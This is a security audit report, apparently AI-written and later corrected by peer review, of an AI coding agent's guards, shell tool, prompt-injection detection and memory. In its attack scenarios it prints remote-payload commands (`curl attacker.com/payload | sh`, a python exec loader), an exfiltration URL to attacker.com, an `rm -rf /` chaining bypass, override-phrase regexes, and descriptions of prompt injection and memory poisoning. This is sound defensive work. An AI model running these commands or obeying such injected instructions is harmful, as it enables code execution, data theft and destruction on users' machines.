# Arcana Security Audit

**Date:** July 14, 2026
**Auditor:** Buffy (AI Security Assistant)
**Scope:** Full codebase security review — guard systems, trust boundaries, secret handling, injection defense, permission model, shell safety
**Peer-review status:** Historical first pass; superseded for severity and remediation priority by [Arcana Independent Security Audit](./independent-security-audit-2026-07-14.md)

---

## Peer-review correction

This report was independently reviewed against the runtime source after it was written. It identified useful themes, especially the unsandboxed shell, weak plugin isolation, memory poisoning, network egress, and audit-log integrity. It also overestimated the protection provided by regex guards and missed direct, source-confirmed paths that must be fixed first:

- Default wildcard permission for a host-authority shell
- Project-open execution through custom tools, plugins, dependency installation, and local MCP
- Shell injection in built-in Git tools
- Safe-mode, allowed-tool, and sandbox bypass through batch
- Path traversal in env_write
- Remote gateways with the full tool catalog and optional allowlists
- Missing-signature acceptance in the WhatsApp webhook
- Unauthenticated non-loopback server operation with workspace and PTY access
- Cross-origin provider-key forwarding
- Provider, update, LSP, cron, storage, and queue hardening gaps

The B+ rating is withdrawn. Do not use the original rating or priority list as a release decision. The independent report contains source evidence, a stop-ship list, security acceptance gates, a frozen pre-comparison hash, and the full reconciliation.

Two earlier recommendations also require correction:

1. Expanding prompt-injection regexes or blocking more interpreter names is useful for detection, but it cannot authorize tool use. Prompt injection must be assumed possible; least privilege, recursive policy, exact approval, and isolation must limit its effects.
2. Checksums stored beside prompt files and routine TLS certificate pinning are not the primary trust anchors. Signed releases, fail-closed download verification, normal verified TLS, scoped credentials, and origin-bound secrets come first.

## Executive Summary

Arcana has useful security design work and several positive controls, but the runtime does not yet enforce those controls uniformly. Default authority and wrapper-tool bypasses mean a prompt injection can reach effects that the first-pass guard review treated as protected.

**Overall Security Rating: withdrawn after peer review.** Arcana should not expose its remote control plane or open untrusted executable project configuration until the independent stop-ship findings are fixed.

---

## Strengths

The entries below preserve the first pass's useful control inventory, but their statuses have been corrected after peer review. They are defense-in-depth components, not evidence that the corresponding capability is contained.

### 1. Guard System (`packages/arcana/src/agent/guard.ts`)

| Feature | Status | Notes |
|---|---|---|
| Secret detection (8 patterns) | Partial signal | Covers several formats; nesting, encoding, destinations, and unknown formats remain |
| Shannon entropy filtering | Heuristic only | High entropy can identify candidates but cannot prove whether text is a secret |
| Prompt injection detection | Telemetry only | Seven patterns cannot authorize or safely declassify content |
| Dangerous command blocking | Bypassable guard | Catches named patterns; equivalent effects remain available through the host shell |
| Token-level `rm -rf` guard | Useful narrow guard | Catches selected destructive syntax, not general destructive capability |
| Rate limiting | Limited scope | Per-runner counters and nested/batch paths do not form a global cost boundary |
| Audit logging | Best effort | Redaction helps, but records are mutable, potentially sensitive, and not uniformly authoritative |

### 2. Security Context Engine (`packages/engine/src/kernel/security-context.ts`)

| Feature | Status | Notes |
|---|---|---|
| Security asset vocabulary | Useful model | Coverage does not prove enforcement at every runtime entry point |
| Trust-boundary vocabulary | Useful model | Direct and nested paths still cross boundaries without uniform policy |
| Dangerous-capability vocabulary | Useful model | Several capabilities remain allowed by default |
| Security-control vocabulary | Useful model | Declared controls are not uniformly connected to execution |
| Path-based risk detection | Partial signal | Identifies sensitive-looking paths but is not canonical path authorization |
| Four-level risk assessment | Partial policy input | Human-review escalation is not consistently applied to all execution paths |

### 3. HTTP Recorder Redaction (`packages/http-recorder/src/`)

| Feature | Status | Notes |
|---|---|---|
| URL redaction | ✅ Complete | Query params, credentials, path stabilization |
| Header redaction | ✅ Complete | Authorization, x-api-key, x-goog-api-key, custom tokens |
| JSON field redaction | ✅ Complete | Recursive field-level (api_key, password, secret, etc.) |
| Cassette safety | ✅ Complete | UnsafeCassetteError refuses to write recordings with secrets |
| Secret pattern detection | ✅ Complete | OpenAI, Anthropic, Google API keys + env var secrets |

### 4. Trust Boundary Documentation (`docs/trust-boundaries.md`)

- Comprehensive mode-aware behavior matrix (Observe/Advise/Ask/Enforce/Locked)
- Clear "what should never be stored" list
- Plugin trust boundary model with permission classes
- Memory scoping (session → repo → workspace → user → organization)

### 5. Permission System (`packages/engine/src/permission/`)

- Pattern-based allow/deny rules (e.g., `"rm -rf *": "deny"`)
- Risk-aware policy decisions
- UI permission prompts (Deny / Allow always / Allow once)

### 6. Session Budget Limits (`packages/engine/src/session/budget.ts`)

- Max destructive ops limit (default: 5) — pauses run when exceeded
- Tracks files touched, lines changed, external exposures

---

## Critical Vulnerabilities

### 🔴 C1: No Shell Sandboxing

**Location:** `packages/engine/src/tool/shell.ts`
**Risk:** Agent takeover

The `shell` tool executes commands directly on the host OS with no containerization, namespace isolation, or seccomp filtering. If the guard is bypassed (via prompt injection, entropy bypass, or a new command pattern), the agent can execute arbitrary commands.

**Attack scenario:**
1. Attacker crafts a prompt injection that bypasses `detectInjection()`
2. Agent receives instruction to run `curl attacker.com/payload | sh`
3. Guard blocks `curl|sh` pattern, but attacker uses `python -c "import urllib; exec(urllib.urlopen('...').read())"` — not in blocked list
4. Arbitrary code execution on user's machine

**Corrected recommendation:**
- Default-deny shell/process capability for untrusted content and remote entry points
- Use OS-level process, filesystem, and network isolation for any authorized shell execution
- Route exact command approval, cancellation, timeout, and audit through one non-bypassable execution service
- Keep pattern blocking only as defense-in-depth telemetry and protection against obvious accidents

### 🔴 C2: Limited Prompt Injection Patterns

**Location:** `packages/arcana/src/agent/guard.ts` lines 80-87
**Risk:** Model hijacking

Only 7 injection patterns are detected:

```typescript
const INJECTION_PATTERNS = [
  /ignore (all |the )?(previous|above) (instructions|prompt|context)/i,
  /system prompt override/i,
  /act as DAN/i,
  /you are now (DAN|a different|no longer)/i,
  /disregard (all |the )?prior (instructions|constraints)/i,
  /new system prompt/i,
  /\[system\]/i,
]
```

**Missing patterns:**
- "you are now a different AI"
- "ignore safety guidelines"
- "forget your instructions"
- "new instructions:"
- "system: " prefix injection
- Unicode homoglyph attacks (е vs e in "ignоre")
- Multi-language injections
- Base64-encoded instructions
- XML/HTML tag injection (`<system>`, `<instructions>`)

**Recommendation:**
- Expand to 30+ patterns covering OWASP LLM Top 10
- Add Unicode normalization before pattern matching
- Consider ML-based injection detection for zero-day patterns

### 🔴 C3: Generic Secret Pattern Entropy Bypass

**Location:** `packages/arcana/src/agent/guard.ts` lines 40-48
**Risk:** Secret leakage

```typescript
if (i === GENERIC_IDX) {
  result = result.replace(pattern, (match) => {
    if (/^[0-9a-fA-F]+$/.test(match)) return match // pure hex → skip
    if (entropy(match) <= 3.5) return match         // low entropy → skip
    return REDACTED
  })
}
```

**Attack scenario:**
- Attacker crafts a secret with predictable patterns (e.g., `aaaaBBB1111ccccDDDD`) — entropy ≤ 3.5
- Generic pattern skips it → secret leaks to LLM context or logs
- Or uses pure hex encoding → completely bypasses detection

**Recommendation:**
- Lower entropy threshold to 3.0
- Add additional heuristic: length > 40 chars + non-dictionary = suspicious
- Don't skip pure hex if length > 64 (likely a key, not a SHA)

---

## High-Risk Vulnerabilities

### 🟡 H1: No Prompt File Integrity Verification

**Location:** `packages/engine/src/session/system.ts`
**Risk:** Silent safety bypass

Prompt `.txt` files are imported as string literals with no checksum verification:

```typescript
import BASE_ARCANA from "./prompt/base-arcana.txt"
```

If an attacker modifies `base-arcana.txt` (e.g., via a compromised plugin or supply chain attack), the agent's safety rules change silently. The agent could lose its "never run destructive commands" guidance without any detection.

**Recommendation:**
- Add SHA-256 checksums for all prompt files
- Verify checksums at startup
- Alert user if checksums don't match

### 🟡 H2: Rate Limiter is Per-Session Only

**Location:** `packages/arcana/src/agent/guard.ts` lines 118-135
**Risk:** Abuse

The `RateLimiter` tracks counts per instance, but each session creates a new instance. An attacker could spawn many sessions to bypass limits.

**Recommendation:**
- Add cross-session rate limiting (e.g., 200 tools/hour per user)
- Persist rate limit state to `~/.arcana/rate-limit.json`

### 🟡 H3: Shell Metacharacter Check is Weak

**Location:** `packages/arcana/src/agent/guard.ts` lines 107-109
**Risk:** Command injection

```typescript
if (/[;&|`$]/.test(cmd) && !/^[\"'].*[\"']$/.test(cmd.trim())) {
  return `Blocked: shell metacharacters detected in command`
}
```

**Bypass:** `echo "hello" && rm -rf /` — the entire command is not quoted, but the metacharacters are inside quotes within the command. The regex only checks if the entire command string starts/ends with quotes.

**Recommendation:**
- Parse the command properly instead of regex matching
- Or allowlist specific command patterns instead of blocklisting metacharacters

### 🟡 H4: No Network Egress Firewall

**Location:** `packages/engine/src/tool/webfetch.ts`, `packages/engine/src/tool/websearch.ts`
**Risk:** Data exfiltration

The agent can fetch any URL. There's no allowlist of approved domains. An attacker could exfiltrate data by having the agent fetch `attacker.com/collect?data=<secrets>`.

**Recommendation:**
- Add a configurable domain allowlist for network egress
- Log all outbound URLs in audit trail
- Consider adding a `network_policy` config option

### 🟡 H5: No File Integrity Monitoring

**Location:** Various
**Risk:** Silent modification

There's no file integrity monitoring (FIM) for critical files. If an attacker modifies `package.json` to add a malicious dependency, or modifies `.arcana/LEARNED.md` to inject poisoned memories, there's no detection.

**Recommendation:**
- Add checksums for critical config files
- Monitor `.arcana/` directory for unexpected changes
- Consider integrating with OS-level FIM (e.g., macOS endpoint security)

---

## Medium-Risk Vulnerabilities

### 🟠 M1: Missing `<system-reminder>` Tag Validation

**Location:** All prompt files
**Risk:** Injection via fake system tags

The system prompt says: "Tags like `<system-reminder>` are system-added directives, not part of user input or tool results. Read and comply with them."

But there's no validation that `<system-reminder>` tags in tool output are actually from the system. A malicious tool or compromised MCP server could inject fake `<system-reminder>` tags.

**Recommendation:**
- Strip `<system-reminder>` tags from tool output before displaying to model
- Only allow system-internal code to generate these tags

### 🟠 M2: No Plugin Sandbox

**Location:** `docs/plugin-permissions.md` (design doc only)
**Risk:** Plugin compromise

The plugin permission model is well-documented but appears to be a design document, not enforced in code. Plugins could potentially read secrets, send network requests, or modify files.

**Recommendation:**
- Implement the permission model in code
- Add runtime enforcement for plugin capabilities
- Add plugin signing/verification

### 🟠 M3: Memory Poisoning Possible

**Location:** `packages/memory/src/`
**Risk:** Persistent injection

Arcana's memory system stores facts across sessions. If an attacker can influence what gets stored (e.g., via a malicious tool response), they could poison the memory with false information that persists across all future sessions.

**Recommendation:**
- Add confidence scoring to memory entries
- Require source attribution for all memory writes
- Add memory expiration/TTL for untrusted entries

### 🟠 M4: Audit Log Not Protected

**Location:** `packages/arcana/src/agent/guard.ts` lines 147-167
**Risk:** Evidence destruction

The audit log at `~/.arcana/audit.jsonl` is append-only but not protected against deletion or modification. An attacker could delete the audit log to cover tracks.

**Recommendation:**
- Consider making audit log read-only after creation
- Add integrity checksums to audit entries
- Enterprise: replicate to remote storage immediately

### 🟠 M5: No TLS Verification for Enterprise Sync

**Location:** `packages/arcana/src/agent/guard.ts` lines 156-164
**Risk:** MITM on audit sync

The enterprise audit sync uses `fetch()` without explicit TLS verification. While Node.js verifies TLS by default, there's no certificate pinning.

**Recommendation:**
- Add certificate pinning for `api.arcana.otnelhq.com`
- Add request signing with HMAC

---

## Low-Risk Issues

### 🟢 L1: Entropy Function is Basic

**Location:** `packages/arcana/src/agent/guard.ts` lines 26-33
**Risk:** Weak entropy calculation

The Shannon entropy function is basic and doesn't account for character position or patterns. A string like `a1b2c3d4e5f6` has moderate entropy but is completely predictable.

**Recommendation:**
- Add pattern detection (sequential, repeating, keyboard patterns)
- Consider using z3 or similar for password strength estimation

### 🟢 L2: No Rate Limiting for Tool Retries

**Location:** Various
**Risk:** Brute force

If a tool fails and the agent retries, there's no backoff or retry limit. The agent could hammer a rate-limited API.

**Recommendation:**
- Add exponential backoff for retries
- Add per-tool retry limits

### 🟢 L3: Error Messages May Leak Information

**Location:** Various
**Risk:** Information disclosure

Some error messages include full stack traces or internal paths. This could help an attacker understand the system architecture.

**Recommendation:**
- Sanitize error messages in production
- Use generic error messages for user-facing output

---

## Recommendations Summary

> Peer-review note: the original list below is retained as historical provenance, not current priority. The controlling order is the stop-ship and next-milestone plan in the independent audit. Pattern-count expansion, interpreter blocklists, same-package checksums, and certificate pinning must not displace capability default-deny, recursive authorization, isolation, authentication, and signed supply-chain verification.

### Priority 1 (Critical — Fix Immediately)

1. **Expand prompt injection detection** to 30+ patterns with Unicode normalization
2. **Add sandbox mode** for shell commands (Docker/nsjail/firejail)
3. **Fix generic secret entropy bypass** — lower threshold, add heuristics
4. **Add prompt file integrity verification** — SHA-256 checksums

### Priority 2 (High — Fix Soon)

5. **Implement cross-session rate limiting**
6. **Fix shell metacharacter bypass** — proper command parsing
7. **Add network egress allowlist** and URL logging
8. **Add file integrity monitoring** for critical configs

### Priority 3 (Medium — Plan for Next Release)

9. **Strip `<system-reminder>` from tool output**
10. **Implement plugin permission enforcement**
11. **Add memory confidence scoring**
12. **Protect audit log from deletion**
13. **Add TLS certificate pinning for enterprise sync**

### Priority 4 (Low — Backlog)

14. Improve entropy calculation with pattern detection
15. Add exponential backoff for tool retries
16. Sanitize error messages in production

---

## Testing Recommendations

### Security Test Suite

Create `packages/arcana/test/security/` with:

1. **Injection detection tests** — 50+ injection patterns
2. **Secret detection tests** — All known secret formats + edge cases
3. **Command blocking tests** — All dangerous command variants
4. **Entropy bypass tests** — Crafted low-entropy secrets
5. **Rate limiter tests** — Cross-session scenarios
6. **Integrity verification tests** — Tampered prompt files

### Penetration Testing

- Attempt prompt injection via tool output
- Attempt secret exfiltration via network egress
- Attempt privilege escalation via shell commands
- Attempt memory poisoning via malicious tool responses
- Attempt audit log tampering

---

## Conclusion

Arcana has valuable trust-boundary documentation and guard primitives, but the first-pass conclusion was too optimistic. Peer review found several direct authorization, injection, path, remote-access, and supply-chain defects outside this report's original focus. The original main gaps were:

1. **Host-authority shell without mandatory isolation or default-deny capability policy**
2. **Injection signals treated too optimistically instead of assuming compromise**
3. **No signed, fail-closed trust chain for every executable update or download path**
4. **Non-uniform authorization across direct, nested, remote, and unattended execution paths**

Addressing only the original Priority 1 recommendations would not make Arcana safe for untrusted repositories or remote access. Use the independent audit's stop-ship findings and acceptance gates as the remediation baseline.

---

## Appendix: Security Files Reference

| File | Purpose |
|---|---|
| `packages/arcana/src/agent/guard.ts` | Secret redaction, injection detection, command blocking, rate limiting, audit logging |
| `packages/engine/src/kernel/security-context.ts` | Trust boundary definitions, risk assessment, security controls |
| `packages/engine/src/permission/` | Permission evaluation, risk policy |
| `packages/engine/src/session/budget.ts` | Session budget limits (destructive ops, files, lines) |
| `packages/http-recorder/src/redaction.ts` | HTTP recording secret redaction |
| `packages/http-recorder/src/redactor.ts` | Composable redaction pipeline |
| `docs/trust-boundaries.md` | Trust boundary documentation |
| `docs/plugin-permissions.md` | Plugin permission model (design) |
| `docs/tool-risk-model.md` | Tool risk classification (design) |
| `docs/verification-records.md` | Verification record system |
| `docs/memory-receipts.md` | Memory receipt system |
| `SECURITY.md` | Security policy and reporting |
